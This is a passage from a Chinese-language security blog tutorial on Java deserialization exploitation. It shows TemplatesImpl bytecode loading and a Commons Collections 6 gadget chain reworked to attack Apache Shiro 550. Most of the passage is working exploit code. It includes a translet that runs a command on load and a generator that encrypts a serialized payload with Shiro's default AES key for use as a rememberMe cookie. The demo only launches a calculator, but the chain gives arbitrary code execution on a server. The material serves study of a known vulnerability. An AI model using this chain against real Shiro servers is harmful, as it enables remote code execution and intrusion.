punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> outerMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token class-name\">Map</span> proxyMap <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">.</span><span class=\"token function\">newProxyInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                        handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        handler <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                construct<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> proxyMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span>ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>字节码文件的内容：、</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// Source code recreated from a .class file by IntelliJ IDEA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// (powered by FernFlower decompiler)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">zijiema</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DOM</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransletException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>runtime<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractTranslet</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>dtm<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DTMAxisIterator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>serializer<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SerializationHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> abstractTranslet <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractTranslet</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> var1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> var1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DTMAxisIterator</span> var2<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span> var3<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token function\">abstractTranslet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello TemplatesImplniganma\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成果文件</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505211622059.png\" alt=\"image-20250521162244745\" /></p>\n<h2 id=\"template在shiro中的利用commons-collections-k1\"><a class=\"anchor\" href=\"#template在shiro中的利用commons-collections-k1\">#</a> Template 在 Shiro 中的利用（Commons Collections K1）</h2>\n<p>在前面的内容中，我们可以将 TemplatesImpl 融合到 COmmons-Collections 利用链中，，执行任意 java 字节码了，但是想了一下，ACC6 这个不是通杀链子嘛，也是可以直接任意代码执行的（现在应该是不行了，java23 运行不了一点），通过 TemplatesImpl 构造的利用链，理论上是可以执行任意 java 代码，这是一种非常统用的代码执行漏洞，不受到对于链的限制，现在讲一个 shiro 的例子</p>\n<h3 id=\"使用cc6攻击shiro550\"><a class=\"anchor\" href=\"#使用cc6攻击shiro550\">#</a> 使用 CC6 攻击 Shiro550</h3>\n<p>如果登录时选择了 remember me 的多选框，则登录成功后服务端会返回一个 rememberMe 的 Cookie：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505221937077.png\" alt=\"image-20250522193710970\" /></p>\n<p>这玩意登录一次成功只会出现一次</p>\n<p>对此，我们攻击过程如下：</p>\n<p>\\1. 使用以前学过的 CommonsCollections 利用链生成一个序列化 Payload</p>\n<p>\\2. 使用 Shiro 默认 Key 进行加密</p>\n<p>\\3. 将密文作为 rememberMe 的 Cookie 发送给服务端</p>\n<p>第一二步就是一个 payload 的传参就行了，</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">MMain</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">myapp<span class=\"token punctuation\">.</span>acc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">myapp<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CommonsCollections6</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>crypto<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AesCipherService</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteSource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Base64</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MMMain</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> payloads <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CommonsCollections6</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getPayload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">AesCipherService</span> aes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AesCipherService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> key <span class=\"token operator\">=</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span>Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kPH+bIxk5D2deZiIxcaaaA==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">ByteSource</span> ciphertext <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span><span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>payloads<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505221932587.png\" alt=\"image-20250522193211374\" /></p>\n<p>用这个 shiro 内置的类 org.apache.shiro.crepto.AesCipherService，最后生成以段字符串。</p>\n<p>直接将这段作为 rememberMe 的值（不做 url 编码），发送给 shiro。结果并没有想我想的弹出计算器，而是 Tomcat 出现了报错</p>\n<p><strong>这些报错是因为如果反序列化流种包含非 java 本身的数组，则会出现无法加载类的错误，</strong></p>\n<p>那么就改造一下 payload，使其没有数组，</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>原来是这样的，我们还得把数组化掉，在 cc6 种，我们用到了一个类，TiedMapEntry，其构造函数接受两个参数，参数一是一个 Map，参数二是一个对象 key。tiedMapEntry 类有个 getvalue 方法，调用了 map 的个题方法，并传入 key：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当这个 map 是 LazyMap 时，其 get 方法就是触发 transform 的关键点：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// create value for key if key is not currently in the map</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">containsKey</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> factory<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">return</span> value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们之前构造 CommonsCollections Gadget 的时候，队 LazyMap#get 方法的参数 key 是不关心的，因为通常 Transformer 数组的首个对象是 ConstantTransformer，我们通过 ConstantTransformer 来初始化恶意对象</p>\n<p>但是此时我们无法使用 transformer 数组了也就不能再用 ConstantTransformer 了，此时我们可以发现这个 LazyMap#get 的参数 key，会被传进 transform（），实际上它可以起到一个 Constant Transformer 的角色 -- 当一个简单的对象传递者。</p>\n<p>那么在回看前面的 Transform 数组：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>第一条就不需要用了数组长度变成一，就不需要数组了</p>\n<p>按照这个方法 我们就可以改造 CommonsCollection6 为 CommonsCollectionShiro 链：</p>\n<p>首先创建 TemplatesImpl 对象：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"...bytescode\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HelloTemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>然后我们创建一个用来调用 newTransformer 方法的 InvokerTransformer，但注意的是，此时先传入一个没用的方法，防止弹出多个计算器（构造时可能会弹计算器）</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span> transformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getClass\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>再将老的 cc6 的代码复制过来，再加上刚刚讲的（将原来的 TiedMapEntry 构造时的第二个参数 key，改为前面创建的 TemplatesImpl 对象）：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> transformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">TiedMapEntry</span> tme <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>outerMap<span class=\"token punctuation\">,</span> obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Map</span> expMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>expMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tme<span class=\"token punctuation\">,</span> <span class=\"token string\">\"valuevalue\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>和之前有点不同的是，之前用的是使用 outerMap.remove (&quot;keykey&quot;)；来移除 key 的副作用，现在用的是 outerMap.clear (); 效果是一样的</p>\n<p>完整的代码：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">sHiRo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token 